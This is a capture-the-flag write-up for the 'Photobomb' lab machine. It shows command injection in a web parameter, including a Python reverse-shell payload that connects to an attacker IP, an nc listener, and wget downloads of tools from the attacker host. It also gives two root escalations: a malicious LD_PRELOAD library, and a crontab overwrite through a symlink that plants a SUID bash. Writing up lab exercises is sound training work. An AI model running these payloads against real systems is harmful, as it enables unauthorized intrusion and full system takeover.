# Photobomb

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>Photobomb</p></figcaption></figure>

## Enumeration

| Port   | State | Service | Version                         |
| ------ | ----- | ------- | ------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80/tcp | open  | http    | nginx 1.18.0                    |

### Port 80 - NGINX 1.18.0

Redirects to [http://photobomb.htb](http://photobomb.htb)

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption><p><a href="http://photobomb.htb/">http://photobomb.htb/</a></p></figcaption></figure>

Attempt to access [http://photobomb.htb/printer](http://photobomb.htb/printer) and get prompted for authentication

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Credentials can be found in http://photobomb.htb/photobomb.js

```bash
curl photobomb.htb/photobomb.js
```

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>Credentials found at http://photobomb.htb/photobomb.js</p></figcaption></figure>

Logging in to [http://photobomb.htb/printer](http://photobomb.htb/printer) shows the below webpage

<figure><img src="../../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption><p><a href="http://photobomb.htb/printer">http://photobomb.htb/printer</a></p></figcaption></figure>

By Clicking on the 'DOWNLOAD PHOTO TO PRINT' link we get a request like the one below in BurpSuite.&#x20;

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption><p>BurpSuite Request</p></figcaption></figure>

## Exploitation

### Command Injection

Send request to Repeater and confirm command injection in the **filetype** parameter

<figure><img src="../../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>Confirm command injection</p></figcaption></figure>

Send reverse shell

{% code overflow="wrap" %}
```python
photo=calvin-craig-T3M72YMf2oc-unsplash.jpg&filetype=png;export RHOST="1.1.1.1";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'&dimensions=1000x1500
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>Using command injection to send a reverse shell</p></figcaption></figure>

Catch reverse shell and clean up

```bash
nc -lvnp 443
export TERM=xterm
# Control z to background process
stty raw -echo
fg
id
/bin/bash
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Catch reverse shell and cleanup</p></figcaption></figure>

## Privilege Escalation

Download and run linpeas

```bash
wget x.x.x.x/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<figure><img src="../../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>Download and run linpeas</p></figcaption></figure>

### Privilege Escalation #1 - LD\_PRELOAD

#### Why?

In the linpeas output we see **SETENV** which allows a custom library to be run in addition to the sudo command. If we load a malicious payload we can utilise this to gain root privileges.&#x20;

<figure><img src="../../../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

#### How?

On the attacking host compile a malicious library file.&#x20;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

{% code overflow="wrap" %}
```bash
gcc -fPIC -shared -o /home/kali/share/ld_preload.so /home/kali/share/ld_preload.c -nostartfiles
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>Compiling the malicious library</p></figcaption></figure>

Download the compiled library and move to the tmp directory.&#x20;

```bash
wget 1.1.1.1/ld_preload.so
mv ld_preload.so /tmp
```

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>Download library and move to tmp folder</p></figcaption></figure>

Run sudo command specifying the library that was downloaded.

```bash
sudo LD_PRELOAD=/tmp/ld_preload.so /opt/cleanup.sh
whoami
id
```

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>Gain root shell with LD_PRELOAD</p></figcaption></figure>

### Privilege Escalation #2 - cron job

#### Why?

In the linpeas output we can see that the `/opt/cleanup.sh` script is being run every 5 minutes.&#x20;

<figure><img src="../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Viewing the contents of this script, the highlighted line shows that the `cat` command is used to effectively copy the contents of `/home/wizard/photobomb/log/photobomb.log` to `/home/wizard/photobomb/log/photobomb.log.old`.

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption><p><code>/opt/cleanup.sh</code> contents</p></figcaption></figure>

Viewing the permissions of the /home/wizard/photobomb/log directory we can see we have write permissions to both files. So we can control the contents of both files and have file copy command run as root. By utilising a symbolic link we can add a cronjob that will be run as root.&#x20;

```bash
ls -al
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Viewing file permissions</p></figcaption></figure>

#### How?

Create a privilege escalation script that will be run by the cronjob and make it executable.&#x20;

```bash
echo "cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash" > /home/wizard/root.sh
chmod +x /home/wizard/root.sh
```

<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption><p>Create privilege escalation script</p></figcaption></figure>

Remove the `/home/wizard/photobomb/log/photobomb.log.old` file and replace it with a symbolic link to `/etc/crontab`. We then copy the contents of the `/etc/crontab` file into the `/home/wizard/photobomb/log/photobomb.log` file. We then append the our cronjob to be run to the `/home/wizard/photobomb/log/photobomb.log`. We then run the `/opt/cleanup.sh` script which will copy the contents of `/home/wizard/photobomb/log/photobomb.log` over the /etc/crontab file which is linked to by `/home/wizard/photobomb/log/photobomb.log.old`.

```bash
rm ~/photobomb/log/photobomb.log.old
ln -s /etc/crontab ~/photobomb/log/photobomb.log.old
cp /etc/crontab ~/photobomb/log/photobomb.log
echo "* * * * * root /home/wizard/root.sh" >> ~/photobomb/log/photobomb.log
sudo /opt/cleanup.sh
```

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Create cronjob</p></figcaption></figure>

Run `/tmp/rootbash` SUID binary to gain a root shell.

```bash
/tmp/rootbash -p
whoami
id
```

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>root shell</p></figcaption></figure>
